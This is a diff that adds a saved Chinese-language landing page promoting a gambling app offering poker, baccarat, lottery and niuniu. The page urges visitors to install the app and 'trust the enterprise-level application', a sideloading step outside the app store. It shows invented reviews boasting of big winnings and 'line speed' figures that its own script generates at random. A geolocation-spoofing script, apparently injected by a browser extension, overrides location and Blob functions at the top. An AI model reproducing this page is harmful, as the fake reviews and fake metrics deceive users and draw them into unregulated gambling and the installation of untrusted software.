@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<!-- 修改： -->
+<html lang="en" style="font-size:100px !important"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>(function(){function MfcuS() {
+  //<![CDATA[
+  window.bwxawJe = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+  window.sZfWjeh = navigator.geolocation.watchPosition.bind(navigator.geolocation);
+  let WAIT_TIME = 100;
+
+  
+  if (!['http:', 'https:'].includes(window.location.protocol)) {
+    // assume the worst, fake the location in non http(s) pages since we cannot reliably receive messages from the content script
+    window.RlWbc = true;
+    window.eDJUo = 38.883333;
+    window.HCeen = -77.000;
+  }
+
+  function waitGetCurrentPosition() {
+    if ((typeof window.RlWbc !== 'undefined')) {
+      if (window.RlWbc === true) {
+        window.WjqxyIr({
+          coords: {
+            latitude: window.eDJUo,
+            longitude: window.HCeen,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        window.bwxawJe(window.WjqxyIr, window.ggRXoPA, window.zPoTc);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof window.RlWbc !== 'undefined')) {
+      if (window.RlWbc === true) {
+        navigator.getCurrentPosition(window.uUrDVpz, window.gxtqEIj, window.IKAyn);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        window.sZfWjeh(window.uUrDVpz, window.gxtqEIj, window.IKAyn);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+    window.WjqxyIr = successCallback;
+    window.ggRXoPA = errorCallback;
+    window.zPoTc = options;
+    waitGetCurrentPosition();
+  };
+  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+    window.uUrDVpz = successCallback;
+    window.gxtqEIj = errorCallback;
+    window.IKAyn = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${MfcuS}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  Object.freeze(navigator.geolocation);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'FAkFMog':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          window.eDJUo = message.info.coords.lat;
+          window.HCeen = message.info.coords.lon;
+          window.RlWbc = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}MfcuS();})()</script>
+  
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+  <link rel="stylesheet" type="text/css" href="./images/reset.css">
+  <link rel="stylesheet" type="text/css" href="./images/swiper.min.css">
+  <link rel="stylesheet" type="text/css" href="./images/style.css">
+  <script src="./images/screen.js.下载"></script>
+  <script src="./images/jquery.js.下载"></script>
+     <script type="text/javascript" charset="UTF-8" src="./images/openinstall.js.下载"></script>
+     <script type="text/javascript" charset="UTF-8" src="./images/383.js.下载"></script>
+     <script type="text/javascript">
+         function DownSoft() {
+             openInstall.wakeupOrInstall();
+             if (isIOS) {
+                 //$("body,html").animate({
+                 //  scrollTop: $("#scroll_div").offset().top
+                 // },0);
+             }
+         }
+     </script>
+     
+ <script>
+    var $_GET = (function() {
+        var url = window.document.location.href.toString();
+        var u = url.split("?");
+        if(typeof(u[1]) == "string") {
+            u = u[1].split("&");
+            var get = {};
+            for(var i in u) {
+                var j = u[i].split("=");
+                get[j[0]] = j[1];
+            }
+            return get;
+        } else {
+            return {};
+        }
+    })();
+    var shareName = $_GET['shareName'] || '';
+	var proxyAccount = $_GET['proxyAccount'] || '';
+    function toUrl(url){
+        window.open(url+"/index.html?shareName="+shareName+ '&proxyAccount=' + proxyAccount,'_blank')
+    }
+</script></head>
+ 
+ <body>
+    <div class="header">
+        <div class="banner">
+            <div class="swiper-container swiper-container-horizontal">
+                <div class="swiper-wrapper" style="transform: translate3d(-710px, 0px, 0px); transition-duration: 0ms;">
+                  <div class="swiper-slide swiper-slide-prev" style="width: 710px;"><a href="javascript:;" onClick="DownSoft();" style="display: block;"> <img src="./images/banner.png"></a></div>
+                  <div class="swiper-slide swiper-slide-active" style="width: 710px;"><a href="javascript:;" onClick="DownSoft();" style="display: block;"> <img src="./images/banner.png"></a></div>
+                </div>
+             <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
+        </div>
+        <div class="gameList">
+          <a href="javascript:;" onClick="DownSoft();" style="display: block;">   <img src="./images/s_05.png"></a>
+        </div>
+        <div class="downIntro">
+            <span class="notice">
+                573万人安装
+            </span>
+          <a href="javascript:;" onClick="DownSoft();" style="display: block;">  <img src="./images/don.png" class="don"></a>
+           
+        </div>
+         <a href="javascript:;" onClick="DownSoft();" class="btn"><img src="./images/down.gif" class="right"></a>
+    </div>
+    <div class="text container" style="display: none;">
+        <div class="textTit">
+            <p>线路检测</p>
+            <span>温馨提示：MS数值越小，开启速度越快！</span>
+        </div>
+        <ul>
+            <li><div class="grayBox"><span><b id="num1">5</b>ms</span><p>WWW.<a href="https://383465.com/383465.com/index.html?shareName=383465.com">110861</a>.com</p></div><a href="https://383465.com/383465.com/index.html?shareName=383465.com">立即进入</a></li>
+            <li><div class="grayBox"><span><b id="num2">9</b>ms</span><p>WWW.<a href="https://383465.com/383465.com/index.html?shareName=383465.com">110862</a>.com</p></div><a href="https://383465.com/383465.com/index.html?shareName=383465.com">立即进入</a></li>
+            <li><div class="grayBox"><span><b id="num3">6</b>ms</span><p>WWW.<a href="https://383465.com/383465.com/index.html?shareName=383465.com">110863</a>.com</p></div><a href="https://383465.com/383465.com/index.html?shareName=383465.com">立即进入</a></li>
+        </ul>
+    </div>
+    <div class="downLoad container">
+        <div class="textTit">
+            <p>安装流程</p>
+        </div>
+        <h2>--------------- 安装流程 ---------------</h2>
+        <ul>
+            <li><span>1</span><p>点击下面<a href="https://383465.com/383465.com/index.html?shareName=383465.com">《立即更新》</a>按钮,确认安装！</p></li>
+            <li><span>2</span><p>返回<a href="https://383465.com/383465.com/index.html?shareName=383465.com">手机桌面</a>，查看<a href="https://383465.com/383465.com/index.html?shareName=383465.com">最新应用更新</a></p></li>
+            <li><span>3</span><p>安装完成后,</p><p><a href="https://383465.com/383465.com/index.html?shareName=383465.com">信任企业级应用</a>，即可使用！</p></li>
+        </ul>
+    </div>
+    <div class="teach" id="mxr">
+        <img src="./images/a_26.png" class="teachTit">
+        <div class="teachBox">
+            <img src="./images/1.png">
+            <img src="./images/2.png">
+            <img src="./images/3.png">
+            <img src="./images/4.png">
+            <img src="./images/5.png">
+            <img src="./images/6.png">
+        </div>
+    </div>
+    <div class="downLoad container">
+        <div class="textTit">
+            <p>公司介绍</p>
+        </div>
+        <div class="introduce">
+            <img src="./images/int.jpg">
+        </div>
+    </div>
+    <div class="line"></div>
+    <div class="hotGame container">
+        <div class="textTit">
+            <p>热门游戏</p>
+        </div>
+        <ul>
+            <li class="bg1"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">德州扑克</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">炸金花</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">百家乐</a></li>
+            <li class="bg2"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">通比牛牛</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">三公</a></li>
+            <li class="bg7"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">抢庄牛牛</a></li>
+            <li class="bg1"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">斗地主</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">捕鱼</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">六合彩</a></li>
+            <li class="bg4"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">百人牛牛</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com">牌九</a></li>
+            <li class="bg4"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">电子游艺</a></li>
+            <li class="bg7 cof"><a href="https://383465.com/383465.com/index.html?shareName=383465.com">体育赛事</a></li>
+            <li><a href="https://383465.com/383465.com/index.html?shareName=383465.com"><span>383</span>.com棋牌竞技</a></li>
+        </ul>
+    </div>
+    <div class="line"></div>
+    <div class="downLoad container">
+        <div class="textTit">
+            <p>用户评价</p>
+        </div>
+        <div class="talkImg">
+            <div class="star">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        <div class="inp">
+            <input type="text" placeholder="请输入您的评语"><button>点评</button>
+        </div>
+        <div class="talkInfor">
+            <h2><p>官方大平台APP,好玩！</p><span>1月28日</span></h2>
+            <h3>评论人：小二的毛巾</h3>
+            <p>功能齐全，游戏齐全，玩法多！超级好玩，赚钱多多，一开始还以为不好玩，现在都爱不释手了！</p>
+        </div>
+        <div class="talkInfor">
+            <h2><p>特别好</p><span>1月28日</span></h2>
+            <h3>评论人：辣子兔</h3>
+            <p>相当好玩的棋牌软件，游戏全，玩法多样，同时提供各种游戏试玩以及教学，轻松上手，无限娱乐。</p>
+        </div>
+        <div class="talkInfor">
+            <h2><p>客服妹子很漂亮</p><span>1月28日</span></h2>
+            <h3>评论人：BBC</h3>
+            <p>这是一款很棒的软件哦！炸金花赚钱就是快啊，玩法多，赚的多，在这赢了不少钱呢！</p>
+        </div>
+        <div class="talkInfor">
+            <h2><p>非常好</p><span>1月29日</span></h2>
+            <h3>评论人：巴拉美少女</h3>
+            <p>值得信赖的一款棋牌类APP，棋牌玩法多，抢庄牛牛/炸金花/斗地主都有，超级棒！</p>
+        </div>
+        <div class="talkInfor">
+            <h2><p>信誉超级棒，赢了很多</p><span>1月29日</span></h2>
+            <h3>评论人：隐藏的富豪</h3>
+            <p>很久没有玩的这么尽兴了，难得的一款超级棒的APP，游戏种类多，玩法多，信誉超级棒，赢了很多。</p>
+        </div>
+    </div>
+    <div class="footer">
+        <img src="./images/a_56.png">
+    </div>
+     <div class="service">
+			<a href="https://temp-chat.mstatik.com/widget/standalone.html?eid=139500" class="service_img" target="_blank">
+				<img src="./images/kefu.png" class="i-kf">
+			</a>
+		</div>
+		<script type="text/javascript" src="./images/f.txt"></script>
+ 
+ <script src="./images/swiper.min.js.下载"></script>
+ <script>
+    var swiperBanner = new Swiper('.banner .swiper-container',{
+        autoplay:true,
+    });
+    var swiperImage = new Swiper('.introducek .swiper-container', {
+      slidesPerView: 2.5,
+      spaceBetween: 30,
+      freeMode: false,
+    });
+    function RandomNumBoth(Min,Max){
+            var Range = Max - Min;
+            var Rand = Math.random();
+            var num = Min + Math.round(Rand * Range); //四舍五入
+            return num;
+    }
+    var num1 =  RandomNumBoth(0,20);
+    var num2 =  RandomNumBoth(0,20);
+    var num3 =  RandomNumBoth(0,20);
+    console.log(num1);
+    console.log(num2);
+    console.log(num3);
+    $('#num1').html(num1);
+    $('#num2').html(num2);
+    $('#num3').html(num3);
+  </script>
+    <script>
+      $(function () {
+      $(".star span").click(function () {
+        var _idx = $(this).index();
+        $(".star span:lt(" + _idx + 1 + ")").addClass("current");
+        $(".star span:gt(" + _idx + ")").removeClass("current");
+      });
+    });
+  </script>
+   <style type="text/css">
+		.service {
+			position: relative;
+		}
+		
+		.i-kf {
+			width: 1.5rem;
+			position: fixed;
+			z-index: 9999;
+			bottom: 0.2rem;
+			right: 0.2rem;
+		}
+	</style>
+
+
+</body></html>
